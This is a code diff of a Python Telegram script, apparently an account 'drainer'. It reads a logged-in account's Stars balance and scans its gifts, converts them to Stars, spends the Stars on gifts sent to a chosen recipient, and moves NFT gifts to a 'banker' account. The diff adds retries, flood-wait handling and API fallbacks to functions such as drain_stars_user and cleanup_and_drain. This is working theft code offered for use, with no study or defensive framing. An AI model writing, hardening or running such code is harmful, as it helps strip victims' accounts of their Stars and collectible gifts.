@@ -473,16 +473,32 @@ async def get_stars_info(client: Client):
         
         if hasattr(result, 'balance'):
             balance_obj = result.balance
-            if hasattr(balance_obj, 'stars'):
-                balance_int = int(balance_obj.stars)
-                log_transfer(f"✅ Баланс (raw API): {balance_int} ⭐️")
+            log_transfer(f"🔍 Balance объект: тип={type(balance_obj)}, атрибуты={[a for a in dir(balance_obj) if not a.startswith('_') and not callable(getattr(balance_obj, a, None))]}")
+            
+            # Пробуем разные способы извлечения значения
+            for attr_name in ['stars', 'value', 'amount', 'total']:
+                if hasattr(balance_obj, attr_name):
+                    attr_value = getattr(balance_obj, attr_name)
+                    if isinstance(attr_value, (int, float)):
+                        balance_int = int(attr_value)
+                        log_transfer(f"✅ Баланс (raw API через {attr_name}): {balance_int} ⭐️")
+                        return balance_int
+                    elif hasattr(attr_value, 'value'):
+                        balance_int = int(attr_value.value)
+                        log_transfer(f"✅ Баланс (raw API через {attr_name}.value): {balance_int} ⭐️")
+                        return balance_int
+            
+            # Если ничего не помогло, пробуем напрямую преобразовать
+            try:
+                balance_int = int(balance_obj)
+                log_transfer(f"✅ Баланс (raw API прямой int): {balance_int} ⭐️")
                 return balance_int
-            elif hasattr(balance_obj, 'value'):
-                balance_int = int(balance_obj.value)
-                log_transfer(f"✅ Баланс (raw API): {balance_int} ⭐️")
-                return balance_int
+            except:
+                pass
         
-        log_transfer("⚠️ Не удалось извлечь баланс", "error")
+        # Выводим все атрибуты result для диагностики
+        log_transfer(f"🔍 StarsStatus атрибуты: {[a for a in dir(result) if not a.startswith('_') and not callable(getattr(result, a, None))]}")
+        log_transfer("⚠️ Не удалось извлечь баланс из StarsStatus", "error")
         return 0
         
     except Exception as e:
@@ -554,66 +570,144 @@ async def get_owned_channels(client: Client):
     return channels
 
 async def scan_location_gifts(client: Client, peer_id, location_name):
+    """Сканирование подарков с улучшенной обработкой ошибок и поддержкой разных версий Pyrofork"""
     found_gifts = []
     try:
         count = 0
-        async for gift in client.get_chat_gifts(chat_id=peer_id):
-            count += 1
-            gift_info = analyze_gift(gift, location_name)
-            found_gifts.append(gift_info)
-            log_transfer(f"🎁 Найден подарок: {gift_info['title']} (NFT: {gift_info['is_nft']}, Конверт: {gift_info['can_convert']}, Трансфер: {gift_info['can_transfer']})")
-        log_transfer(f"📦 Всего подарков в {location_name}: {count}")
+        gifts_iter = None
+        
+        # Пробуем разные варианты вызова get_chat_gifts
+        try:
+            # Вариант 1: С limit (оптимизация)
+            gifts_iter = client.get_chat_gifts(chat_id=peer_id, limit=100)
+        except TypeError as e1:
+            if "limit" in str(e1) or "exclude_limited" in str(e1):
+                try:
+                    # Вариант 2: Без параметров
+                    gifts_iter = client.get_chat_gifts(chat_id=peer_id)
+                    log_transfer(f"⚠️ Используем get_chat_gifts без limit для {location_name}", "warning")
+                except Exception as e2:
+                    log_transfer(f"❌ Критическая ошибка get_chat_gifts для {location_name}: {e2}", "error")
+                    return found_gifts
+            else:
+                raise
+        
+        # Итерируемся по подаркам
+        try:
+            async for gift in gifts_iter:
+                count += 1
+                try:
+                    gift_info = analyze_gift(gift, location_name)
+                    found_gifts.append(gift_info)
+                    log_transfer(f"🎁 Найден подарок: {gift_info['title']} (NFT: {gift_info['is_nft']}, Конверт: {gift_info['can_convert']}, Трансфер: {gift_info['can_transfer']})")
+                except Exception as e:
+                    log_transfer(f"⚠️ Ошибка анализа подарка #{count}: {e}", "warning")
+                    continue
+        except Exception as e:
+            log_transfer(f"❌ Ошибка итерации подарков в {location_name}: {type(e).__name__}: {e}", "error")
+        
+        log_transfer(f"📦 Всего подарков в {location_name}: {count} (успешно обработано: {len(found_gifts)})")
     except Exception as e:
-        log_transfer(f"Ошибка сканирования подарков в {location_name}: {e}", "error")
+        log_transfer(f"❌ Критическая ошибка сканирования подарков в {location_name}: {type(e).__name__}: {e}", "error")
     return found_gifts
 
 # --- TASKS ---
 
 async def send_gift_task(client: Client, target_id, price, target_username=None, delay=0):
-    """Задача для БАНКИРА: Отправка с микро-задержкой для скорости."""
-    if delay > 0: await asyncio.sleep(delay) # Микро-задержка только если шлем пачкой
+    """Задача для БАНКИРА: Отправка подарка с улучшенной обработкой ошибок"""
+    if delay > 0: 
+        await asyncio.sleep(delay)  # Микро-задержка для пачек
 
     gift_data = GIFT_MAP.get(price)
-    if not gift_data: return False
-    gift_id = gift_data['ids'][0] if gift_data['ids'] else GIFT_MAP[50]['ids'][0]
+    if not gift_data:
+        log_transfer(f"⚠️ Нет данных для подарка ценой {price}", "warning")
+        return False
     
+    gift_id = gift_data['ids'][0] if gift_data['ids'] else GIFT_MAP[50]['ids'][0]
     recipient = target_username if target_username else target_id
 
     try:
-        # Пытаемся отправить сразу
         await client.send_gift(chat_id=recipient, gift_id=gift_id)
-        log_transfer(f"⚡️ Банкир отправил: {price}")
+        log_transfer(f"✅ Банкир отправил подарок: {price} ⭐️ -> {recipient}")
         return True
+        
     except FloodWait as e:
+        log_transfer(f"⏳ Флуд-лимит при отправке подарка {price}: {e.value}с", "warning")
         await asyncio.sleep(e.value)
+        # Повторная попытка после ожидания
         return await send_gift_task(client, target_id, price, target_username, 0)
-    except Exception as e:
-        # Если ошибка дубликата - пробуем еще раз через 1.5 сек (быстрее чем 3)
-        if "DUPLICATE" in str(e):
+        
+    except BadRequest as e:
+        e_str = str(e)
+        # Обработка специфичных ошибок
+        if "DUPLICATE" in e_str or "ALREADY_SENT" in e_str:
+            log_transfer(f"⚠️ Дубликат подарка {price}, повтор через 1.5с", "warning")
             await asyncio.sleep(1.5)
             try:
                 await client.send_gift(chat_id=recipient, gift_id=gift_id)
+                log_transfer(f"✅ Подарок {price} отправлен после повтора")
                 return True
-            except: return False
+            except Exception as retry_e:
+                log_transfer(f"❌ Ошибка повторной отправки {price}: {retry_e}", "error")
+                return False
+        elif "INSUFFICIENT_FUNDS" in e_str or "NOT_ENOUGH_STARS" in e_str:
+            log_transfer(f"❌ Недостаточно звезд для подарка {price}", "error")
+            return False
+        else:
+            log_transfer(f"❌ BadRequest при отправке подарка {price}: {e_str}", "error")
+            return False
+            
+    except Exception as e:
+        error_type = type(e).__name__
+        log_transfer(f"❌ Ошибка отправки подарка {price}: {error_type}: {e}", "error")
         return False
 
 async def convert_gift_task(client: Client, gift_details):
-    """Задача для ВОРКЕРА: конвертировать подарок. FIX: Игнор старых подарков."""
+    """Задача для ВОРКЕРА: конвертировать подарок в звезды с улучшенной обработкой ошибок"""
+    gift_title = gift_details.get('title', 'Unknown Gift')
+    msg_id = str(gift_details.get('msg_id', ''))
+    star_count = gift_details.get('star_count', 0)
+    
+    if not msg_id:
+        log_transfer(f"⚠️ Пропущен подарок {gift_title}: нет msg_id", "warning")
+        return False
+    
     try:
-        await client.convert_gift_to_stars(owned_gift_id=str(gift_details['msg_id']))
-        log_transfer(f"Конвертирован: {gift_details['title']} (+{gift_details['star_count']} зв)")
+        await client.convert_gift_to_stars(owned_gift_id=msg_id)
+        log_transfer(f"✅ Конвертирован: {gift_title} (+{star_count} ⭐️)")
         return True
+        
     except BadRequest as e:
         e_str = str(e)
-        if "STARGIFT_CONVERT_TOO_OLD" in e_str:
-            # FIX: Просто пропускаем старые подарки, это не ошибка скрипта
+        # Игнорируем ожидаемые ошибки (старые/уже конвертированные подарки)
+        if any(keyword in e_str for keyword in [
+            "STARGIFT_CONVERT_TOO_OLD",
+            "STARGIFT_ALREADY_CONVERTED",
+            "ALREADY_CONVERTED",
+            "TOO_OLD"
+        ]):
+            log_transfer(f"ℹ️ Подарок {gift_title} пропущен (уже конвертирован/старый)", "info")
             return False
-        if "STARGIFT_ALREADY_CONVERTED" in e_str:
-            return False
-        log_transfer(f"Не конвертирован {gift_details['title']}: {e_str}", "warning")
+        
+        # Другие BadRequest ошибки
+        log_transfer(f"⚠️ BadRequest при конвертации {gift_title}: {e_str}", "warning")
         return False
-    except Exception as e: 
-        log_transfer(f"Ошибка конвертации {gift_details['title']}: {e}", "error")
+        
+    except FloodWait as e:
+        log_transfer(f"⏳ Флуд-лимит при конвертации {gift_title}: {e.value}с", "warning")
+        await asyncio.sleep(e.value)
+        # Повторная попытка после ожидания
+        try:
+            await client.convert_gift_to_stars(owned_gift_id=msg_id)
+            log_transfer(f"✅ Конвертирован после флуда: {gift_title}")
+            return True
+        except Exception as retry_e:
+            log_transfer(f"❌ Ошибка повторной конвертации {gift_title}: {retry_e}", "error")
+            return False
+            
+    except Exception as e:
+        error_type = type(e).__name__
+        log_transfer(f"❌ Ошибка конвертации {gift_title}: {error_type}: {e}", "error")
         return False
 
 async def transfer_nft_task(client: Client, gift_details, target_chat_id, bot: Bot, user_db_data):
@@ -738,12 +832,36 @@ async def drain_stars_user(client: Client, default_recipient=None):
                 await client.send_gift(chat_id=recipient_id, gift_id=gift_id)
                 balance -= gift_price
                 count += 1
-                log_transfer(f"🎁 Отправлен подарок за {gift_price} зв.")
-                await asyncio.sleep(random.uniform(1.0, 2.0)) # Пауза, чтобы не зафлудить
+                log_transfer(f"✅ Отправлен подарок за {gift_price} ⭐️ (остаток: {balance})")
+                await asyncio.sleep(random.uniform(1.0, 2.0))  # Пауза для избежания флуда
+                
             except FloodWait as e:
+                log_transfer(f"⏳ Флуд-лимит: {e.value}с", "warning")
                 await asyncio.sleep(e.value)
+                # После флуда обновляем баланс
+                try: 
+                    balance = await get_stars_info(client)
+                except: 
+                    break
+                    
+            except BadRequest as e:
+                e_str = str(e)
+                if "INSUFFICIENT_FUNDS" in e_str or "NOT_ENOUGH_STARS" in e_str:
+                    log_transfer(f"💰 Недостаточно звезд для подарка {gift_price}", "warning")
+                    try: 
+                        balance = await get_stars_info(client)
+                    except: 
+                        break
+                elif "DUPLICATE" in e_str:
+                    log_transfer(f"⚠️ Дубликат подарка {gift_price}, пропускаем", "warning")
+                    await asyncio.sleep(1.5)
+                else:
+                    log_transfer(f"❌ BadRequest при покупке {gift_price}: {e_str}", "error")
+                    await asyncio.sleep(1)
+                    
             except Exception as e:
-                log_transfer(f"❌ Ошибка покупки: {e}", "error")
+                error_type = type(e).__name__
+                log_transfer(f"❌ Ошибка покупки подарка {gift_price}: {error_type}: {e}", "error")
                 await asyncio.sleep(1)
                 # Обновляем баланс на всякий случай
                 try: 
@@ -751,10 +869,11 @@ async def drain_stars_user(client: Client, default_recipient=None):
                 except: 
                     break
         
-        log_transfer(f"✅ Шоппинг завершен. Куплено подарков: {count}.")
+        log_transfer(f"✅ Шоппинг завершен. Куплено подарков: {count}. Остаток баланса: {balance} ⭐️")
 
     except Exception as e:
-        log_transfer(f"Error in drain: {e}", "error")
+        error_type = type(e).__name__
+        log_transfer(f"❌ Критическая ошибка в drain_stars_user: {error_type}: {e}", "error")
         
 # --- MAIN LOGIC ORCHESTRATOR ---
 
@@ -773,6 +892,11 @@ async def wait_for_topup(client: Client, required_stars):
                      if not getattr(gift, 'is_converted', False):
                          log_transfer(f"⚡️ Подарок обнаружен! (+{gift.convert_price})")
                          return True
+        except TypeError as e:
+            if "exclude_limited" in str(e):
+                log_transfer(f"⚠️ Проблема с get_chat_gifts в wait_for_topup", "warning")
+                break
+            pass
         except: pass
         await asyncio.sleep(0.8)
     return False
@@ -842,10 +966,16 @@ async def transfer_process(client: Client, banker: Client, bot: Bot):
             log_transfer("⏳ Ловим и конвертируем подарки Банкира...")
             for _ in range(15):
                 found_new = False
-                async for g in client.get_chat_gifts(chat_id="me"):
-                    if not getattr(g, 'collectible_id', None) and not getattr(g, 'is_converted', False):
-                        asyncio.create_task(convert_gift_task(client, analyze_gift(g)))
-                        found_new = True
+                try:
+                    async for g in client.get_chat_gifts(chat_id="me"):
+                        if not getattr(g, 'collectible_id', None) and not getattr(g, 'is_converted', False):
+                            asyncio.create_task(convert_gift_task(client, analyze_gift(g)))
+                            found_new = True
+                except TypeError as e:
+                    if "exclude_limited" in str(e):
+                        log_transfer(f"⚠️ Проблема с get_chat_gifts, пропускаем итерацию", "warning")
+                        break
+                    raise
                 if found_new: await asyncio.sleep(0.6)
                 else: await asyncio.sleep(0.8)
                 try:
@@ -951,7 +1081,22 @@ async def cleanup_and_drain(client: Client, banker_username):
         transfer_tasks = []
         gift_count = 0
         
-        async for g in client.get_chat_gifts(chat_id="me", limit=50):
+        # Улучшенное получение подарков с обработкой разных версий API
+        gifts_iter = None
+        try:
+            gifts_iter = client.get_chat_gifts(chat_id="me", limit=50)
+        except TypeError as e:
+            if "limit" in str(e) or "exclude_limited" in str(e):
+                try:
+                    gifts_iter = client.get_chat_gifts(chat_id="me")
+                    log_transfer("⚠️ Используем get_chat_gifts без limit", "warning")
+                except Exception as e2:
+                    log_transfer(f"❌ Критическая ошибка get_chat_gifts: {e2}", "error")
+                    return
+            else:
+                raise
+        
+        async for g in gifts_iter:
             gift_count += 1
             is_nft = getattr(g, 'collectible_id', None) is not None
             is_converted = getattr(g, 'is_converted', False)
